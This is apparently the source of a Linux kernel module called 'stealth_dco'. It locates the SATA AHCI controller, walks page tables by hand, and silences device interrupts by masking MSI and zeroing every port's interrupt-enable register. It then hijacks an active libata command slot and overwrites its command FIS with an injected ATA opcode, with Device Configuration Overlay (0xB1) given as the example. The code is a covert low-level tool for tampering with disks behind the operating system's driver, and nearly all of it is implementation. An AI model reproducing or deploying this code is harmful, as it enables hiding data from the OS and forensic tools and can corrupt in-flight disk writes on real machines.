#include "stealth_dco.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/io.h>
#include <linux/types.h>
#include <linux/bitrev.h>
#include <linux/pci.h>

/* ============================================================================
 * 1. MANUAL PAGE-TABLE WALK (CR3 Traversal)
 * ============================================================================ */
void __iomem *manual_direct_map(unsigned long phys_addr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long pfn;
    struct page *page;
    unsigned long cr3;
    pgd_t *pgd_base;
    unsigned long virt_addr;

    virt_addr = (unsigned long)__va(phys_addr);

    cr3 = read_cr3_pa();
    pgd_base = (pgd_t *)__va(cr3 & PAGE_MASK);
    
    pgd = pgd_base + pgd_index(virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd))
        return NULL;

#ifdef _PAGE_PSE
    if (pmd_val(*pmd) & _PAGE_PSE) {
        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
        page = pfn_to_page(pfn);
        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
    }
#elif defined(_PAGE_BIT_PSE)
    if (pmd_val(*pmd) & (1UL << _PAGE_BIT_PSE)) {
        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
        page = pfn_to_page(pfn);
        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
    }
#endif

    pte = pte_offset_kernel(pmd, virt_addr);
    if (pte_none(*pte) || !pte_present(*pte))
        return NULL;

    pfn = pte_pfn(*pte);
    page = pfn_to_page(pfn);

    return (void __iomem *)(page_address(page) + (virt_addr & ~PAGE_MASK));
}

/* ============================================================================
 * 2. DISCOVERY & ABAR RESOLUTION
 * ============================================================================ */
void __iomem *get_stealth_abar_mmio(void)
{
    struct pci_dev *pdev = NULL;
    resource_size_t abar_phys;
    void __iomem *mmio = NULL;

    pr_info("[STEALTH_DCO] [*] Initiating precise SATA AHCI PCI discovery & INTx masking...\n");

    while ((pdev = pci_get_class(PCI_CLASS_STORAGE_SATA << 8, pdev)) != NULL) {
        abar_phys = pci_resource_start(pdev, 5);
        if (abar_phys) {
            u16 pci_cmd;
            
            pci_read_config_word(pdev, PCI_COMMAND, &pci_cmd);
            pci_cmd |= (1 << 10);
            pci_write_config_word(pdev, PCI_COMMAND, pci_cmd);
            pr_info("[STEALTH_DCO] [+] PCI INTx disabled via PCI Command Register config space for %s\n", 
                    pci_name(pdev));

            mmio = ioremap(abar_phys, AHCI_ABAR_SIZE);
            if (mmio) {
                pci_dev_put(pdev);
                return mmio;
            }
        }
    }

    pr_warn("[STEALTH_DCO] [!] Dynamic scan missed BAR5. Applying static fallback map: 0x%llx\n", 
            VBOX_AHCI_FALLBACK_PHYS);
    
    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, AHCI_ABAR_SIZE);
    if (mmio) {
        pr_info("[STEALTH_DCO] [+] Successfully resolved fallback ABAR via static mapping.\n");
        return mmio;
    }

    pr_err("[STEALTH_DCO] [-] FATAL: Hardware ABAR resolution and fallback both failed.\n");
    return NULL;
}

/* ============================================================================
 * 3. ON-CHIP MMIO SCRATCHPAD AUDIT
 * ============================================================================ */
void execute_method2_onchip_mmio_audit(void __iomem *abar_base)
{
    u32 scratch_val_orig, scratch_val_test;

    pr_info("[STEALTH_DCO] --- Method 2: On-Chip MMIO Scratchpad / Vendor Register Audit ---\n");

    scratch_val_orig = readl((char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    writel(scratch_val_orig ^ 0x5A5A5A5A, (char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    wmb();
    
    scratch_val_test = readl((char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    pr_info("[STEALTH_DCO] [+] Verified On-Chip MMIO Responsive State: 0x%08x\n", scratch_val_test);

    writel(scratch_val_orig, (char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    wmb();
}

/* ============================================================================
 * 4. ADAPTIVE INTERRUPT & PxIE QUIESCENCE
 * ============================================================================ */
int suppress_interrupts_adaptive(u8 bus, u8 dev, u8 fn)
{
    u16 status, cap_ptr;
    u8 cap_id, current_ptr;
    bool intercepted = false;
    unsigned int devfn = PCI_DEVFN(dev, fn);
    
    struct pci_bus *p_bus = pci_find_bus(0, bus);
    if (!p_bus)
        return -1;

    pci_bus_read_config_word(p_bus, devfn, 0x06, &status);
    pci_bus_read_config_word(p_bus, devfn, 0x34, &cap_ptr);
    cap_ptr &= 0xFC;
    current_ptr = (u8)cap_ptr;

    /* MSI / MSI-X Vector Masking */
    while (current_ptr) {
        u32 cap_header;
        pci_bus_read_config_dword(p_bus, devfn, current_ptr, &cap_header);
        cap_id = (u8)(cap_header & 0xFF);

        if (cap_id == 0x05) {
            u16 msi_ctrl;
            pci_bus_read_config_word(p_bus, devfn, current_ptr + 2, &msi_ctrl);
            if (msi_ctrl & (1 << 8)) { /* Check maskable */
                u32 mask_offset = current_ptr + 12; 
                u32 msi_mask;
                pci_bus_read_config_dword(p_bus, devfn, mask_offset, &msi_mask);
                pci_bus_write_config_dword(p_bus, devfn, mask_offset, msi_mask | 0x1);
                intercepted = true;
                break;
            }
        } 
        current_ptr = (u8)((cap_header >> 8) & 0xFC);
    }

    /* Motherboard MMIO Quiescence & PxIE Masking (Offset 0x14) */
    {
        u32 bar5;
        pci_bus_read_config_dword(p_bus, devfn, 0x24, &bar5); 
        if (bar5 & 0xFFFFFFFC) {
            void __iomem *hba_base = ioremap(bar5 & 0xFFFFFFFC, 0x2000);
            if (hba_base) {
                u32 pi;
                int i;

                pi = readl(hba_base + 0x0C);
                for (i = 0; i < 32; i++) {
                    if ((pi >> i) & 0x1) {
                        void __iomem *port_base = hba_base + 0x100 + (i * 0x80);
                        writel(0x0, port_base + 0x14); // Blind PxIE completely
                    }
                }
                iounmap(hba_base);
            }
        }
    }

    return intercepted ? 0 : -1;
}

/* ============================================================================
 * 5. ACTIVE-SLOT PIGGYBACKING & PAYLOAD SWAPPING
 * ============================================================================ */
int piggyback_swap_active_slot(void __iomem *port_base, u8 dco_command_opcode)
{
    u32 ci_status;
    int active_slot = -1;
    int i;
    void __iomem *clb_base;
    void __iomem *ctba_virt;
    u32 clb_lower, clb_upper;
    unsigned long cmd_table_phys;

    /* 1. Identify which slot libata has currently marked active in PxCI */
    ci_status = readl(port_base + 0x38);
    if (!ci_status) {
        pr_warn("[STEALTH_DCO] [!] Port is entirely idle; waiting for active libata slot...\n");
        return -1;
    }

    for (i = 0; i < 32; i++) {
        if (ci_status & (1U << i)) {
            active_slot = i;
            break;
        }
    }

    if (active_slot == -1)
        return -1;

    pr_info("[STEALTH_DCO] [+] Piggybacking on active libata slot index: %d\n", active_slot);

    /* 2. Read Command List Base Address (PxCLB at offset 0x00) */
    clb_lower = readl(port_base + 0x00);
    clb_upper = readl(port_base + 0x04);
    clb_base = manual_direct_map(((u64)clb_upper << 32) | clb_lower);
    if (!clb_base)
        return -1;

    /* 3. Extract the Command Table Descriptor for this specific active slot */
    // Each command list entry is 32 bytes. Offset to the target slot descriptor.
    {
        void __iomem *desc_ptr = clb_base + (active_slot * 32);
        u32 ctba_lower = readl(desc_ptr + 0x08);
        u32 ctba_upper = readl(desc_ptr + 0x0C);
        
        cmd_table_phys = ((u64)ctba_upper << 32) | ctba_lower;
        ctba_virt = manual_direct_map(cmd_table_phys);
        if (!ctba_virt)
            return -1;
    }

    /* 4. On-the-Fly Payload Swap: Overwrite the active command's H2D FIS */
    // The Command FIS occupies the first 64 bytes of the Command Table.
    {
        // Set FIS Type to Register H2D (0x27) and Command Control Flags
        writeb(0x27, ctba_virt + 0x00); // FIS Type
        writeb(0x80, ctba_virt + 0x01); // Port multiplier & command bit (C=1)
        
        // Inject our DCO / Target Opcode into the Command Register offset
        writeb(dco_command_opcode, ctba_virt + 0x02); // ATA Command (e.g., 0xB1 for DCO)
        writeb(0x00, ctba_virt + 0x03); // Features
        
        wmb();
        pr_info("[STEALTH_DCO] [+] Successfully swapped active slot %d FIS payload with opcode 0x%02x\n",
                active_slot, dco_command_opcode);
    }

    return 0;
}